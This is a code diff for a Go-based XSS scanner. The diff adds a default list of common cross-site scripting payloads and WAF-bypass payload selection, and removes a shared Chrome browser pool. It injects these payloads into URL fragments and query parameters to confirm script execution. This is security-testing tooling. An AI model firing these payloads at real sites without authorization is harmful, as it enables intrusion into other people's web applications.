@@ -63,8 +63,10 @@ func NewPayloadConfig(custom []payloads.Payload, first bool) *PayloadConfig {
 	}
 }
 
-// getTestPayloads returns the payload strings to test, optionally filtered by WAF
-func getTestPayloads(waf string, config *PayloadConfig) []string {
+// getTestPayloads returns the payload strings to test
+// If testAll is false, returns only high-success-rate payloads (default)
+// If testAll is true, returns all payloads
+func getTestPayloads(waf string, config *PayloadConfig, testAll bool) []string {
 	var result []string
 
 	// Add custom payloads first if configured
@@ -79,21 +81,54 @@ func getTestPayloads(waf string, config *PayloadConfig) []string {
 		result = append(result, p.Value)
 	}
 
-	if waf != "" {
-		// Add WAF-specific bypass payloads
-		for _, p := range payloads.GetPayloadsByWAF(waf) {
-			result = append(result, p.Value)
+	if testAll {
+		// Test all payloads
+		if waf != "" {
+			for _, p := range payloads.GetPayloadsByWAF(waf) {
+				result = append(result, p.Value)
+			}
+		} else {
+			base := payloads.GetBasePayloads()
+			for _, p := range base {
+				result = append(result, p.Value)
+			}
 		}
 	} else {
-		// Add a selection of base payloads (not all, to keep scan time reasonable)
-		base := payloads.GetBasePayloads()
-		// Use up to 20 base payloads
-		limit := 20
-		if len(base) < limit {
-			limit = len(base)
+		// Default: only high-success-rate payloads
+		highRate := []string{
+			// Basic script injection
+			`<script>alert(1)</script>`,
+			`"><script>alert(1)</script>`,
+			`'><script>alert(1)</script>`,
+			// Event handler injection
+			`<img src=x onerror=alert(1)>`,
+			`"><img src=x onerror=alert(1)>`,
+			`<svg onload=alert(1)>`,
+			`"><svg onload=alert(1)>`,
+			// JavaScript context
+			`alert(1)`,
+			`'-alert(1)-'`,
+			`"-alert(1)-"`,
+			`${alert(1)}`,
+			// HTML injection
+			`<details open ontoggle=alert(1)>`,
+			`<body onload=alert(1)>`,
+			// DOM specific
+			`javascript:alert(1)`,
+			`data:text/html,<script>alert(1)</script>`,
 		}
-		for i := 0; i < limit; i++ {
-			result = append(result, base[i].Value)
+		result = append(result, highRate...)
+
+		// Add WAF-specific payloads if WAF detected
+		if waf != "" {
+			wafPayloads := payloads.GetPayloadsByWAF(waf)
+			limit := 5
+			if len(wafPayloads) < limit {
+				limit = len(wafPayloads)
+			}
+			for i := 0; i < limit; i++ {
+				result = append(result, wafPayloads[i].Value)
+			}
 		}
 	}
 
@@ -219,36 +254,11 @@ func extractDomain(ctx context.Context) string {
 	return ""
 }
 
-// BrowserPool manages a reusable Chrome browser instance
-type BrowserPool struct {
-	ctx    context.Context
-	cancel context.CancelFunc
-	auth   *AuthConfig
-}
-
-// NewBrowserPool creates a new browser pool
-func NewBrowserPool(auth *AuthConfig) *BrowserPool {
-	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
-	taskCtx, _ := newChromeContext(ctx, auth, disableCORSFlag)
-	return &BrowserPool{
-		ctx:    taskCtx,
-		cancel: cancel,
-		auth:   auth,
-	}
-}
-
-// Close closes the browser pool
-func (p *BrowserPool) Close() {
-	if p.cancel != nil {
-		p.cancel()
-	}
-}
-
 // VerifyURL tests a URL for reflected DOM XSS
-func VerifyURL(targetURL string, auth *AuthConfig, waf string, limiter *compliance.RateLimiter, config *PayloadConfig, maxConfirm int) []VerifyResult {
+func VerifyURL(targetURL string, auth *AuthConfig, waf string, limiter *compliance.RateLimiter, config *PayloadConfig, maxConfirm int, testAll bool) []VerifyResult {
 	// Default parameters for backward compatibility
 	defaultParams := []string{"q", "search", "id", "page", "input", "name", "s"}
-	return VerifyURLWithParams(targetURL, auth, waf, defaultParams, limiter, config, maxConfirm)
+	return VerifyURLWithParams(targetURL, auth, waf, defaultParams, limiter, config, maxConfirm, testAll)
 }
 
 // countConfirmed counts how many results are confirmed
@@ -263,21 +273,17 @@ func countConfirmed(results []VerifyResult) int {
 }
 
 // VerifyURLWithParams tests a URL for reflected DOM XSS with custom parameters
-func VerifyURLWithParams(targetURL string, auth *AuthConfig, waf string, params []string, limiter *compliance.RateLimiter, config *PayloadConfig, maxConfirm int) []VerifyResult {
+func VerifyURLWithParams(targetURL string, auth *AuthConfig, waf string, params []string, limiter *compliance.RateLimiter, config *PayloadConfig, maxConfirm int, testAll bool) []VerifyResult {
 	var results []VerifyResult
-	testPayloads := getTestPayloads(waf, config)
+	testPayloads := getTestPayloads(waf, config, testAll)
 
 	if len(params) == 0 {
 		params = []string{"q", "search", "id", "page", "input", "name", "s"}
 	}
 
-	// Create browser pool for reuse
-	pool := NewBrowserPool(auth)
-	defer pool.Close()
-
 	for _, payload := range testPayloads {
 		// Test hash fragment
-		r := testHashWithPool(pool, targetURL, payload, limiter)
+		r := testHash(targetURL, payload, auth, limiter)
 		results = append(results, r)
 		if maxConfirm > 0 && countConfirmed(results) >= maxConfirm {
 			return results
@@ -285,7 +291,7 @@ func VerifyURLWithParams(targetURL string, auth *AuthConfig, waf string, params 
 
 		// Test each parameter
 		for _, param := range params {
-			r = testSearchParamWithPool(pool, targetURL, param, payload, limiter)
+			r = testSearchParam(targetURL, param, payload, auth, limiter)
 			results = append(results, r)
 			if maxConfirm > 0 && countConfirmed(results) >= maxConfirm {
 				return results
@@ -297,17 +303,13 @@ func VerifyURLWithParams(targetURL string, auth *AuthConfig, waf string, params 
 }
 
 // VerifyURLWithContext tests a URL with context-aware payload selection
-func VerifyURLWithContext(targetURL string, auth *AuthConfig, waf string, paramContexts map[string]string, limiter *compliance.RateLimiter, config *PayloadConfig, maxConfirm int) []VerifyResult {
+func VerifyURLWithContext(targetURL string, auth *AuthConfig, waf string, paramContexts map[string]string, limiter *compliance.RateLimiter, config *PayloadConfig, maxConfirm int, testAll bool) []VerifyResult {
 	var results []VerifyResult
 
-	// Create browser pool for reuse
-	pool := NewBrowserPool(auth)
-	defer pool.Close()
-
 	// Test hash fragment with default payloads
-	testPayloads := getTestPayloads(waf, config)
+	testPayloads := getTestPayloads(waf, config, testAll)
 	for _, payload := range testPayloads[:min(5, len(testPayloads))] {
-		r := testHashWithPool(pool, targetURL, payload, limiter)
+		r := testHash(targetURL, payload, auth, limiter)
 		results = append(results, r)
 		if maxConfirm > 0 && countConfirmed(results) >= maxConfirm {
 			return results
@@ -325,7 +327,7 @@ func VerifyURLWithContext(targetURL string, auth *AuthConfig, waf string, paramC
 		fmt.Printf("    Testing '%s' (context: %s) with %d payloads\n", param, ctxType, len(contextPayloads))
 
 		for _, payload := range contextPayloads {
-			r := testSearchParamWithPool(pool, targetURL, param, payload, limiter)
+			r := testSearchParam(targetURL, param, payload, auth, limiter)
 			results = append(results, r)
 			if maxConfirm > 0 && countConfirmed(results) >= maxConfirm {
 				return results
@@ -389,57 +391,6 @@ func testHash(baseURL, payload string, auth *AuthConfig, limiter *compliance.Rat
 		result.Detail = "JavaScript execution confirmed (window.xssTriggered=true)"
 	} else if result.Triggered {
 		// alert() dialog was triggered - already set by event listener
-	} else if strings.Contains(domContent, Canary) {
-		if isCanaryExecutable(domContent, Canary) {
-			result.Triggered = true
-			result.Detail = "Canary in executable position (script/event handler)"
-		} else {
-			result.Triggered = false
-			result.Detail = "Input reflected but not in executable position"
-		}
-	}
-
-	return result
-}
-
-func testHashWithPool(pool *BrowserPool, baseURL, payload string, limiter *compliance.RateLimiter) VerifyResult {
-	result := VerifyResult{Payload: payload, Source: "hash"}
-	testURL := baseURL + "#" + url.QueryEscape(payload)
-
-	if limiter != nil {
-		limiter.Wait()
-	}
-
-	chromedp.ListenTarget(pool.ctx, func(ev interface{}) {
-		if _, ok := ev.(*page.EventJavascriptDialogOpening); ok {
-			result.Triggered = true
-			result.Detail = "alert() dialog triggered"
-		}
-	})
-
-	var domContent string
-	var jsTriggered bool
-
-	err := chromedp.Run(pool.ctx,
-		chromedp.Navigate(testURL),
-		chromedp.Sleep(2*time.Second),
-		chromedp.Evaluate(`window.xssTriggered || false`, &jsTriggered),
-		chromedp.InnerHTML("html", &domContent),
-	)
-
-	if err != nil {
-		if result.Triggered {
-			return result
-		}
-		result.Detail = "navigation error: " + err.Error()
-		return result
-	}
-
-	if jsTriggered {
-		result.Triggered = true
-		result.Detail = "JavaScript execution confirmed (window.xssTriggered=true)"
-	} else if result.Triggered {
-		// alert() dialog was triggered
 	} else if strings.Contains(domContent, Canary) {
 		if isCanaryExecutable(domContent, Canary) {
 			result.Triggered = true
@@ -518,67 +469,6 @@ func testSearchParam(baseURL, param, payload string, auth *AuthConfig, limiter *
 			result.Detail = "Canary in executable position (script/event handler)"
 		} else {
 			// Canary is just reflected text, not executable XSS
-			result.Triggered = false
-			result.Detail = "Input reflected but not in executable position"
-		}
-	}
-
-	return result
-}
-
-func testSearchParamWithPool(pool *BrowserPool, baseURL, param, payload string, limiter *compliance.RateLimiter) VerifyResult {
-	result := VerifyResult{Payload: payload, Source: "search:" + param}
-
-	parsedURL, err := url.Parse(baseURL)
-	if err != nil {
-		result.Detail = "invalid URL"
-		return result
-	}
-
-	q := parsedURL.Query()
-	q.Set(param, payload)
-	parsedURL.RawQuery = q.Encode()
-	testURL := parsedURL.String()
-
-	if limiter != nil {
-		limiter.Wait()
-	}
-
-	chromedp.ListenTarget(pool.ctx, func(ev interface{}) {
-		if _, ok := ev.(*page.EventJavascriptDialogOpening); ok {
-			result.Triggered = true
-			result.Detail = "alert() dialog triggered"
-		}
-	})
-
-	var domContent string
-	var jsTriggered bool
-
-	err = chromedp.Run(pool.ctx,
-		chromedp.Navigate(testURL),
-		chromedp.Sleep(2*time.Second),
-		chromedp.Evaluate(`window.xssTriggered || false`, &jsTriggered),
-		chromedp.InnerHTML("html", &domContent),
-	)
-
-	if err != nil {
-		if result.Triggered {
-			return result
-		}
-		result.Detail = "navigation error: " + err.Error()
-		return result
-	}
-
-	if jsTriggered {
-		result.Triggered = true
-		result.Detail = "JavaScript execution confirmed (window.xssTriggered=true)"
-	} else if result.Triggered {
-		// alert() dialog was triggered
-	} else if strings.Contains(domContent, Canary) {
-		if isCanaryExecutable(domContent, Canary) {
-			result.Triggered = true
-			result.Detail = "Canary in executable position (script/event handler)"
-		} else {
 			result.Triggered = false
 			result.Detail = "Input reflected but not in executable position"
 		}
@@ -950,7 +840,7 @@ func testStoredInput(ctx context.Context, baseURL string, input inputInfo, paylo
 
 // TestHashOnly tests only hash-based XSS (for analyzer)
 func TestHashOnly(targetURL string, auth *AuthConfig, waf string, config *PayloadConfig) VerifyResult {
-	payloads := getTestPayloads(waf, config)
+	payloads := getTestPayloads(waf, config, false)
 	if len(payloads) == 0 {
 		return VerifyResult{Source: "hash", Detail: "no payloads available"}
 	}
@@ -962,7 +852,7 @@ func TestHashOnly(targetURL string, auth *AuthConfig, waf string, config *Payloa
 
 // TestSearchOnly tests only search parameter XSS (for analyzer)
 func TestSearchOnly(targetURL string, auth *AuthConfig, waf string, config *PayloadConfig) VerifyResult {
-	payloads := getTestPayloads(waf, config)
+	payloads := getTestPayloads(waf, config, false)
 	if len(payloads) == 0 {
 		return VerifyResult{Source: "search", Detail: "no payloads available"}
 	}
